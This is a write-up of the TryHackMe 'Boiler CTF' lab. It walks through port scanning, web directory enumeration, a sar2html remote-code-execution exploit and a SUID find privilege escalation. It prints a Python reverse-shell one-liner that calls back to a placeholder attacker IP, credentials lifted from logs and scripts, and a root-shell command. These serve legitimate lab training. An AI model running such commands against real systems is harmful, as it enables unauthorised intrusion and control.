# [Boiler CTF](https://tryhackme.com/room/boilerctf2)

First as usual, `nmap`

```
# Nmap 7.92 scan initiated Fri Sep 24 15:55:54 2021 as: nmap -vvv -p 21,80,10000,55007 -sCV -oA init 10.10.197.172
Nmap scan report for box.ip (10.10.197.172)
Host is up, received conn-refused (0.23s latency).
Scanned at 2021-09-24 15:55:55 +07 for 38s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.17.21.200
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: E960DC070906C66E7F31A9170FD45E51
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 24 15:56:33 2021 -- 1 IP address (1 host up) scanned in 39.36 seconds
```

Looking at FTP, we have anonymous login. With that, we have 1 file we can download.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
```

With the file downloaded, we can see that it's a message but rot13'd, which we can easily rot13 again to get the message.

```sh
$ cat .info.txt | rot13
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!
```

So that was nothing useful. Looking at the web service on port 80, we just have the Apache2 Ubuntu default page. Looking at `/robots.txt` though, we have some interesting entries.

```
User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075
```

The files and directories listed don't point to any page. The numbers at the bottom, however, looks interesting. However, after some decoding, I got nothing so it might just be another rabbit hole.

Running `gobuster` ...

```sh
$ gobuster dir -u "http://box.ip/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -r
/manual               (Status: 200) [Size: 626]
/joomla               (Status: 200) [Size: 12437]
/server-status        (Status: 403) [Size: 294]
```

We have a joomla server. We can get the whole structure from [github](https://github.com/joomla/joomla-cms) since it's an open-source project. We still should run `gobuster` to look for non-standard files and directories.

```sh
$ gobuster dir -u "http://box.ip/joomla/" -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -r -o joomla
/images               (Status: 200) [Size: 31]
/modules              (Status: 200) [Size: 31]
/media                (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 12458]
/bin                  (Status: 200) [Size: 31]
/tests                (Status: 200) [Size: 1549]
/templates            (Status: 200) [Size: 31]
/plugins              (Status: 200) [Size: 31]
/includes             (Status: 200) [Size: 31]
/language             (Status: 200) [Size: 31]
/components           (Status: 200) [Size: 31]
/cache                (Status: 200) [Size: 31]
/libraries            (Status: 200) [Size: 31]
/installation         (Status: 200) [Size: 5786]
/build                (Status: 200) [Size: 3384]
/tmp                  (Status: 200) [Size: 31]
/layouts              (Status: 200) [Size: 31]
/administrator        (Status: 200) [Size: 5140]
/configuration.php    (Status: 200) [Size: 0]
/cli                  (Status: 200) [Size: 31]
/_files               (Status: 200) [Size: 168]
```

`/_files` stands out so we check it out. The page is just a big piece of text.

```
VjJodmNITnBaU0JrWVdsemVRbz0K
```

This, however, is just the string "Whopsie daisy" base64-encoded twice. Another rabbit hole. I then ran `gobuster` again with a different wordlist.

```sh
$ gobuster dir -u "http://box.ip/joomla/" -w ~/tools/SecLists/Discovery/Web-Content/raft-medium-words.txt -x php -r -t 100 -o joomla

/components           (Status: 200) [Size: 31]
/language             (Status: 200) [Size: 31]
/includes             (Status: 200) [Size: 31]
/libraries            (Status: 200) [Size: 31]
/images               (Status: 200) [Size: 31]
/media                (Status: 200) [Size: 31]
/administrator        (Status: 200) [Size: 5140]
/templates            (Status: 200) [Size: 31]
/index.php            (Status: 200) [Size: 12458]
/.                    (Status: 200) [Size: 12442]
/modules              (Status: 200) [Size: 31]
/plugins              (Status: 200) [Size: 31]
/cache                (Status: 200) [Size: 31]
/tmp                  (Status: 200) [Size: 31]
/bin                  (Status: 200) [Size: 31]
/installation         (Status: 200) [Size: 5786]
/tests                (Status: 200) [Size: 1549]
/layouts              (Status: 200) [Size: 31]
/configuration.php    (Status: 200) [Size: 0]
/_test                (Status: 200) [Size: 4802]
/build                (Status: 200) [Size: 3384]
/_archive             (Status: 200) [Size: 162]
/_files               (Status: 200) [Size: 168]
/_database            (Status: 200) [Size: 160]
/cli                  (Status: 200) [Size: 31]
```

(Results with status 403 removed.) Among the results, `_.*` items stand out. First to be checked out is `_test`. The page says "sar2html" right up front so we look up exploits for that with `searchsploit` and get a couple of results.

```sh
$ searchsploit sar2html
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
sar2html 3.2.1 - 'plot' Remote Code Execution                                        | php/webapps/49344.py
Sar2HTML 3.2.1 - Remote Command Execution                                            | php/webapps/47204.txt
------------------------------------------------------------------------------------- ---------------------------------
```

Looking at the pre-made exploit `php/webapps/49344.py`, we have a simple RCE. We can simply open a listener, run the exploit and provide a suitable reverse shell to get a shell. After trying several shells, I found `python` to work.

```sh
export RHOST="YOUR_IP";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

With that, we should have a shell as "www-data".

Right in the landing directory, we have `log.txt`.

```sh
www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt
Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$
Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

Within the log are credentials for "basterd" which we can use to `su basterd`.

Checking basterd's privileges ...

```sh
basterd@Vulnerable:/var/www/html/joomla/_test$ sudo -l
[sudo] password for basterd:
Sorry, user basterd may not run sudo on Vulnerable.
```

We can't run `sudo`. Looking at basterd's home directory, we have `backup.sh`.

```sh
basterd@Vulnerable:~$ ls -l
total 4
-rwxr-xr-x 1 stoner basterd 699 Aug 21  2019 backup.sh
```

Looking inside the file, we have stoner's password which we can, again, use to `su stoner`.

Checking our privileges ...

```sh
stoner@Vulnerable:/home/basterd$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

This time, we seem to have something we can run. However, the file doesn't exist and we can create `/NotThisTime` so it's just another rabbit hole. Looking for SUID files ...

```sh
stoner@Vulnerable:/home/basterd$ find / -perm -4000 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

We see that `find` has the SUID bit set. Following [GTFObins](https://gtfobins.github.io/gtfobins/find/#suid), we can get a shell as root with it.

```sh
find . -exec /bin/sh -p \; -quit
```

With that, we should have  a root shell on the machine.
